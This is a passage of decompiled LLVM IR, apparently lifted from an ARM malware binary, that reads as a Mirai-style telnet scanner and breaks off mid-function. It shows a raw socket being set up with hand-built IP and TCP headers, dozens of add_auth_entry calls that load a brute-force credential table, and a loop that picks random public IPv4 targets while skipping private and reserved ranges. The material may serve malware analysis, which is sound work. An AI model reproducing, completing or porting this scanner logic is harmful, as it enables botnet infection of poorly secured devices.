dec_label_pc_f6a4:                                ; preds = %dec_label_pc_f680
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_f6a8 = load i32, i32* @r5, align 4
  store i32 %v0_f6a8, i32* @r2, align 4
  %v2_f6ac = call i32 @__libc_fcntl(i32 %v3_f68c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_f6b4 = or i32 %v2_f6ac, 2048
  store i32 %v1_f6b4, i32* @r2, align 4
  %v0_f6b8 = load i32, i32* @r4, align 4
  store i32 %v0_f6b8, i32* %r0.global-to-local, align 4
  %v2_f6bc = call i32 @__libc_fcntl(i32 %v0_f6b8, i32 4)
  %v2_f6c4 = load i32, i32* @global_var_26128.176, align 4
  store i32 %v2_f6c4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_f6d0 = load i32, i32* @r5, align 4
  store i32 %v0_f6d0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_f6d8 = ptrtoint i16* %stack_var_-52 to i32
  store i32 %v2_f6d8, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i16 1, i16* %stack_var_-52, align 2
  %v5_f6e8 = call i32 @__GI_setsockopt(i32 %v2_f6c4, i32 %v0_f6d0, i32 3, i32 %v2_f6d8, i32 4)
  store i32 %v5_f6e8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6ec = icmp eq i32 %v5_f6e8, 0
  store i1 %v2_f6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6ec, label %dec_label_pc_f6f4, label %dec_label_pc_fdf4

dec_label_pc_f6f4:                                ; preds = %dec_label_pc_f6a4, %dec_label_pc_f6f4
  %v0_f6f4 = call i32 @rand_next()
  %v3_f6f8 = mul i32 %v0_f6f4, 65536
  store i32 %v3_f6f8, i32* %r0.global-to-local, align 4
  %v1_f700 = mul i32 %v0_f6f4, 256
  %v3_f704 = and i32 %v1_f700, 65280
  %tmp348 = udiv i32 %v0_f6f4, 256
  %v4_f708 = urem i32 %tmp348, 256
  %v5_f708 = or i32 %v4_f708, %v3_f704
  store i32 %v5_f708, i32* %r3.global-to-local, align 4
  %v2_f70c = icmp ugt i32 %v5_f708, 1023
  store i1 %v2_f70c, i1* %cpsr_c.global-to-local, align 1
  %v7_f70c = icmp eq i32 %v5_f708, 1024
  store i1 %v7_f70c, i1* %cpsr_z.global-to-local, align 1
  %v3_f714 = icmp ult i32 %v5_f708, 1022
  br i1 %v3_f714, label %dec_label_pc_f6f4, label %dec_label_pc_f718

dec_label_pc_f718:                                ; preds = %dec_label_pc_f6f4
  %v5_f710.le = trunc i32 %v0_f6f4 to i16
  store i32 ptrtoint (i8** @global_var_23614.178 to i32), i32* %r0.global-to-local, align 4
  %v2_f71c = load i8, i8* bitcast (i8** @global_var_23614.178 to i8*), align 4
  %v3_f71c = zext i8 %v2_f71c to i32
  %v1_f720 = and i32 %v3_f71c, 240
  %v1_f724 = or i32 %v1_f720, 5
  store i32 %v1_f724, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_23614.178 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_23616.179 to i16*), align 4
  %v0_f744 = call i32 @rand_next()
  %v1_f744 = trunc i32 %v0_f744 to i16
  %v3_f74c = load i8, i8* @global_var_23634.182, align 1
  store i32 ptrtoint (i32* @global_var_23628.181 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_23614.178 to i32), i32* %ip.global-to-local, align 4
  %tmp = urem i8 %v3_f74c, 16
  %v1_f758 = zext i8 %tmp to i32
  %v1_f75c = or i32 %v1_f758, 80
  store i32 %v1_f75c, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r4, align 4
  store i8 64, i8* bitcast (i32* @global_var_2361c.183 to i8*), align 4
  store i16 %v1_f744, i16* bitcast (i32* @global_var_23618.184 to i16*), align 4
  %v1_f770 = trunc i32 %v1_f75c to i8
  store i8 %v1_f770, i8* @global_var_23634.182, align 1
  store i8 6, i8* bitcast (i32* @global_var_2361d.185 to i8*), align 4
  %v4_f778 = sext i16 %v5_f710.le to i32
  store i32 %v4_f778, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_2362a.186, align 2
  store i16 %v5_f710.le, i16* bitcast (i32* @global_var_23628.181 to i16*), align 4
  %v0_f788 = call i32 @rand_next()
  %v1_f788 = trunc i32 %v0_f788 to i16
  %v3_f790 = load i8, i8* @global_var_23635.187, align 1
  %v4_f790 = zext i8 %v3_f790 to i32
  store i32 ptrtoint (i32* @global_var_23628.181 to i32), i32* %ip.global-to-local, align 4
  %v1_f798 = or i32 %v4_f790, 2
  store i32 %v1_f798, i32* %r3.global-to-local, align 4
  store i16 %v1_f788, i16* bitcast (i32* @global_var_23636.188 to i16*), align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a7dc.190 to i32), i32* %r1.global-to-local, align 4
  %v1_f7a4 = trunc i32 %v1_f798 to i8
  store i8 %v1_f7a4, i8* @global_var_23635.187, align 1
  store i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f7b0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a7dc.190 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e4.194 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f7c0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a7e4.194 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a7ec.196 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_f7d0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a7ec.196 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32* %r1.global-to-local, align 4
  %v5_f7e0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7f8.198 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_f7f0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32 ptrtoint (i32* @global_var_1a7f8.198 to i32), i32 17)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_f800 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a8d8.202 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f810 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a8d8.202 to i32), i32 9)
  store i32 ptrtoint ([4 x i8]* @global_var_1a808.204 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_f820 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1a808.204 to i32), i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a814.208 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_f830 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a814.208 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a81c.210 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_f840 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a81c.210 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_f850 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a824.212 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f860 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a824.212 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a82c.214 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f870 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a82c.214 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a838.216 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f880 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a838.216 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a840.218 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f890 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a840.218 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a848.220 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f8a0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a848.220 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a854.222 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_f8b0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a854.222 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a85c.224 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_f8c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([4 x i8]* @global_var_1a85c.224 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a860.226 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_f8d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a860.226 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a868.228 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_f8e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([4 x i8]* @global_var_1a868.228 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a86c.230 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f8f0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a86c.230 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a7ec.196 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_f900 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a7ec.196 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7f8.198 to i32), i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_f910 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint (i32* @global_var_1a7f8.198 to i32), i32 16)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a878.232 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f920 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a878.232 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a880.234 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_f930 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a880.234 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1a888.236 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v5_f940 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([11 x i8]* @global_var_1a888.236 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a894.238 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_f950 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a894.238 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a89c.240 to i32), i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_f960 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), i32 ptrtoint (i32* @global_var_1a89c.240 to i32), i32 16)
  store i32 ptrtoint ([8 x i8]* @global_var_1a854.222 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_f970 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a854.222 to i32), i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a8ac.242 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a8ac.242 to i32), i32* %r1.global-to-local, align 4
  %v5_f980 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a8ac.242 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a8ac.242 to i32), i32 8)
  %v0_f984 = load i32, i32* @r4, align 4
  store i32 %v0_f984, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a8b4.244 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32* %r1.global-to-local, align 4
  %v4_f990 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1a8b4.244 to i32), i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32 %v0_f984)
  store i32 ptrtoint ([4 x i8]* @global_var_1a8bc.246 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_f9a0 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1a8bc.246 to i32), i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), i32 3)
  store i32 ptrtoint ([8 x i8]* @global_var_1a8c0.248 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a8c0.248 to i32), i32* %r1.global-to-local, align 4
  %v5_f9b0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a8c0.248 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a8c0.248 to i32), i32 14)
  store i32 ptrtoint ([11 x i8]* @global_var_1a8c8.250 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a8d4.252 to i32), i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v5_f9c0 = call i32 @add_auth_entry(i32 ptrtoint ([11 x i8]* @global_var_1a8c8.250 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a8d4.252 to i32), i32 18)
  store i32 %v5_f9c0, i32* %r0.global-to-local, align 4
  %v2_f9c8 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_f9c8, i32* @lr, align 4
  br label %dec_label_pc_f9d0

dec_label_pc_f9d0:                                ; preds = %dec_label_pc_10110, %dec_label_pc_f718
  %stack_var_-1880.0 = phi i32 [ %v2_f9c8, %dec_label_pc_f718 ], [ %stack_var_-1880.1, %dec_label_pc_10110 ]
  %stack_var_-1876.0 = phi i16 [ %v5_f710.le, %dec_label_pc_f718 ], [ %stack_var_-1876.1, %dec_label_pc_10110 ]
  store i32 ptrtoint (i32* @global_var_23644.163 to i32), i32* %r0.global-to-local, align 4
  %v2_f9d4 = load i32, i32* @global_var_23644.163, align 4
  store i32 %v2_f9d4, i32* @r4, align 4
  %v0_f9d8 = load i32, i32* @fp, align 4
  %v3_f9d8 = icmp uge i32 %v0_f9d8, %v2_f9d4
  store i1 %v3_f9d8, i1* %cpsr_c.global-to-local, align 1
  %v9_f9d8 = icmp eq i32 %v0_f9d8, %v2_f9d4
  store i1 %v9_f9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f9d8, label %dec_label_pc_fc58, label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %dec_label_pc_f9d0
  store i32 0, i32* %r3.global-to-local, align 4
  store i16 0, i16* %stack_var_-52, align 2
  %v2_f9e8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_f9e8, i32* @r5, align 4
  br label %dec_label_pc_f9ec

dec_label_pc_f9ec:                                ; preds = %.thread39, %dec_label_pc_f9e0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_fa00 = call i32 @rand_next()
  %v1_fa00 = trunc i32 %v0_fa00 to i16
  store i32 %v0_fa00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2610c.91 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_23614.178 to i32), i32* %r2.global-to-local, align 4
  %v2_fa0c = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_fa0c, i32* %r3.global-to-local, align 4
  store i16 %v1_fa00, i16* bitcast (i32* @global_var_23618.184 to i16*), align 4
  store i32 %v2_fa0c, i32* @global_var_23620.253, align 4
  br label %dec_label_pc_fa18

dec_label_pc_fa18:                                ; preds = %dec_label_pc_faec, %dec_label_pc_fa48, %dec_label_pc_fb20, %dec_label_pc_fb14, %dec_label_pc_fb08, %dec_label_pc_fafc, %.thread30, %bb367, %bb366, %bb365, %bb364, %bb363, %dec_label_pc_fae4, %dec_label_pc_fadc, %bb359, %dec_label_pc_faac, %dec_label_pc_fa88, %bb352, %dec_label_pc_fa58, %bb351, %dec_label_pc_fa40, %bb350, %bb369, %dec_label_pc_f9ec
  %v0_fa18 = call i32 @rand_next()
  store i32 %v0_fa18, i32* %r0.global-to-local, align 4
  %v1_fa1c = urem i32 %v0_fa18, 256
  store i32 %v1_fa1c, i32* %r1.global-to-local, align 4
  %v3_fa20 = udiv i32 %v0_fa18, 256
  store i32 %v3_fa20, i32* %r3.global-to-local, align 4
  %v3_fa24 = udiv i32 %v0_fa18, 65536
  store i32 %v3_fa24, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa28 = icmp eq i32 %v1_fa1c, 0
  store i1 %v2_fa28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa28, label %bb350, label %bb349

bb349:                                            ; preds = %dec_label_pc_fa18
  %v3_fa2c = icmp ugt i32 %v1_fa1c, 126
  store i1 %v3_fa2c, i1* %cpsr_c.global-to-local, align 1
  %v8_fa2c = icmp eq i32 %v1_fa1c, 127
  store i1 %v8_fa2c, i1* %cpsr_z.global-to-local, align 1
  br label %bb350

bb350:                                            ; preds = %dec_label_pc_fa18, %bb349
  %v0_fa3c = phi i1 [ true, %dec_label_pc_fa18 ], [ %v8_fa2c, %bb349 ]
  %v1_fa30 = urem i32 %v3_fa20, 256
  store i32 %v1_fa30, i32* %ip.global-to-local, align 4
  %v1_fa34 = urem i32 %v3_fa24, 256
  store i32 %v1_fa34, i32* %r2.global-to-local, align 4
  %v1_fa38 = and i32 %v0_fa18, 8388608
  %v2_fa38 = icmp ne i32 %v1_fa38, 0
  store i1 %v2_fa38, i1* %cpsr_c.global-to-local, align 1
  %v3_fa38 = udiv i32 %v0_fa18, 16777216
  store i32 %v3_fa38, i32* %r0.global-to-local, align 4
  br i1 %v0_fa3c, label %dec_label_pc_fa18, label %dec_label_pc_fa40

dec_label_pc_fa40:                                ; preds = %bb350
  %v2_fa40 = icmp ugt i32 %v1_fa1c, 2
  store i1 %v2_fa40, i1* %cpsr_c.global-to-local, align 1
  %v7_fa40 = icmp eq i32 %v1_fa1c, 3
  store i1 %v7_fa40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa40, label %dec_label_pc_fa18, label %dec_label_pc_fa48

dec_label_pc_fa48:                                ; preds = %dec_label_pc_fa40
  %v1_fa48 = add nsw i32 %v1_fa1c, -15
  store i32 %v1_fa48, i32* %r3.global-to-local, align 4
  %v2_fa4c = icmp ugt i32 %v1_fa1c, 55
  store i1 %v2_fa4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa4c = icmp eq i32 %v1_fa1c, 56
  store i1 %v7_fa4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa4c, label %dec_label_pc_fa18, label %bb351

bb351:                                            ; preds = %dec_label_pc_fa48
  %v3_fa50 = icmp ne i32 %v1_fa48, 0
  store i1 %v3_fa50, i1* %cpsr_c.global-to-local, align 1
  %v8_fa50 = icmp eq i32 %v1_fa48, 1
  store i1 %v8_fa50, i1* %cpsr_z.global-to-local, align 1
  %v2_fa54 = xor i1 %v3_fa50, true
  %v3_fa54 = or i1 %v8_fa50, %v2_fa54
  br i1 %v3_fa54, label %dec_label_pc_fa18, label %dec_label_pc_fa58

dec_label_pc_fa58:                                ; preds = %bb351
  %v2_fa58 = icmp ugt i32 %v1_fa1c, 9
  store i1 %v2_fa58, i1* %cpsr_c.global-to-local, align 1
  %v7_fa58 = icmp eq i32 %v1_fa1c, 10
  store i1 %v7_fa58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa58, label %dec_label_pc_fa18, label %dec_label_pc_fa60

dec_label_pc_fa60:                                ; preds = %dec_label_pc_fa58
  %v2_fa60 = icmp ugt i32 %v1_fa1c, 191
  store i1 %v2_fa60, i1* %cpsr_c.global-to-local, align 1
  %v7_fa60 = icmp eq i32 %v1_fa1c, 192
  store i1 %v7_fa60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa60, label %bb352, label %dec_label_pc_fa6c

bb352:                                            ; preds = %dec_label_pc_fa60
  %v3_fa64 = icmp ugt i32 %v1_fa30, 167
  store i1 %v3_fa64, i1* %cpsr_c.global-to-local, align 1
  %v8_fa64 = icmp eq i32 %v1_fa30, 168
  store i1 %v8_fa64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fa64, label %dec_label_pc_fa18, label %dec_label_pc_fa6c

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_fa60, %bb352
  %v7_fa6c = icmp eq i32 %v1_fa1c, 172
  %.429 = zext i1 %v7_fa6c to i32
  store i32 %.429, i32* %r3.global-to-local, align 4
  %v2_fa78 = icmp ugt i32 %v1_fa30, 14
  store i1 %v2_fa78, i1* %cpsr_c.global-to-local, align 1
  %v7_fa78 = icmp eq i32 %v1_fa30, 15
  store i1 %v7_fa78, i1* %cpsr_z.global-to-local, align 1
  %v2_fa7c = xor i1 %v2_fa78, true
  %v3_fa7c = or i1 %v7_fa78, %v2_fa7c
  br i1 %v3_fa7c, label %.thread8, label %bb355

.thread8:                                         ; preds = %dec_label_pc_fa6c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa90

bb355:                                            ; preds = %dec_label_pc_fa6c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa80 = icmp eq i1 %v7_fa6c, false
  store i1 %v2_fa80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa80, label %dec_label_pc_fa90, label %dec_label_pc_fa88

dec_label_pc_fa88:                                ; preds = %bb355
  %v2_fa88 = icmp ugt i32 %v1_fa30, 30
  store i1 %v2_fa88, i1* %cpsr_c.global-to-local, align 1
  %v7_fa88 = icmp eq i32 %v1_fa30, 31
  store i1 %v7_fa88, i1* %cpsr_z.global-to-local, align 1
  %v2_fa8c = xor i1 %v2_fa88, true
  %v3_fa8c = or i1 %v7_fa88, %v2_fa8c
  br i1 %v3_fa8c, label %dec_label_pc_fa18, label %dec_label_pc_fa90

dec_label_pc_fa90:                                ; preds = %.thread8, %dec_label_pc_fa88, %bb355
  %v7_fa90 = icmp eq i32 %v1_fa1c, 100
  %.430 = zext i1 %v7_fa90 to i32
  store i32 %.430, i32* %r3.global-to-local, align 4
  %v2_fa9c = icmp ugt i32 %v1_fa30, 62
  store i1 %v2_fa9c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa9c = icmp eq i32 %v1_fa30, 63
  store i1 %v7_fa9c, i1* %cpsr_z.global-to-local, align 1
